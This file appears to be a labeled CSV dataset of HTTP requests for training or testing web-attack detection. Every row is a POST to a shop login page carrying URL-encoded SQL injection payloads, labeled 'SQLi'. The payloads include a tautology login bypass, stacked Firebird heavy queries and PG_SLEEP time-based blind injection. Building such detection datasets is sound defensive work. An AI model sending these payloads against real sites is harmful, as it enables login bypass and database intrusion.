,id,method,path,query,label
0,10000,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%29%3B%20SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%3B--%20AND%20%28%28%28%27WRPY%27%3D%27WRPY,SQLi
1,10001,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%3B%20SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%3B--%20AND%20%27aVny%27%3D%27aVny,SQLi
2,10002,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%3B%20SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%3B--%20AND%20%28%27Cqlx%27%20LIKE%20%27Cqlx,SQLi
3,10003,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%3B%20SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%3B--%20AND%20%28%28%27XEpm%27%20LIKE%20%27XEpm,SQLi
4,10004,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%29%3B%20SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%3B--%20AND%20%28%28%28%27PZyd%27%20LIKE%20%27PZyd,SQLi
5,10005,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%3B%20SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%3B--%20AND%20%27OcgM%27%20LIKE%20%27OcgM,SQLi
6,10006,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%3B%20SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%3B--%20AND%20%28%22mcgp%22%3D%22mcgp,SQLi
7,10007,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%3B%20SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%3B--%20AND%20%28%28%22CfJo%22%3D%22CfJo,SQLi
8,10008,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%3B%20SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%3B--%20AND%20%28%28%28%22CfHe%22%3D%22CfHe,SQLi
9,10009,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%3B%20SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%3B--%20AND%20%22ApnO%22%3D%22ApnO,SQLi
10,10010,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%3B%20SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%3B--%20AND%20%28%22hyyH%22%20LIKE%20%22hyyH,SQLi
11,10011,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%3B%20SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%3B--%20AND%20%28%28%22YUff%22%20LIKE%20%22YUff,SQLi
12,10012,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%3B%20SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%3B--%20AND%20%28%28%28%22VTJO%22%20LIKE%20%22VTJO,SQLi
13,10013,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%3B%20SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%3B--%20AND%20%22oagQ%22%20LIKE%20%22oagQ,SQLi
14,10014,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29,SQLi
15,10015,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29,SQLi
16,10016,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29,SQLi
17,10017,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29,SQLi
18,10018,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29%20AND%20%281637%3D1637,SQLi
19,10019,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%283980%3D3980,SQLi
20,10020,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%28%283104%3D3104,SQLi
21,10021,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29,SQLi
22,10022,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27tqEi%27%3D%27tqEi,SQLi
23,10023,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%28%27AhQE%27%3D%27AhQE,SQLi
24,10024,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%29%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%28%28%27glhL%27%3D%27glhL,SQLi
25,10025,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29%20AND%20%27fITC%27%3D%27fITC,SQLi
26,10026,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27wohj%27%20LIKE%20%27wohj,SQLi
27,10027,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%28%27CqkZ%27%20LIKE%20%27CqkZ,SQLi
28,10028,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%29%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%28%28%27OeqW%27%20LIKE%20%27OeqW,SQLi
29,10029,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29%20AND%20%27OWJQ%27%20LIKE%20%27OWJQ,SQLi
30,10030,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%22GrBu%22%3D%22GrBu,SQLi
31,10031,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%28%22ZlfZ%22%3D%22ZlfZ,SQLi
32,10032,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%28%28%22YwBc%22%3D%22YwBc,SQLi
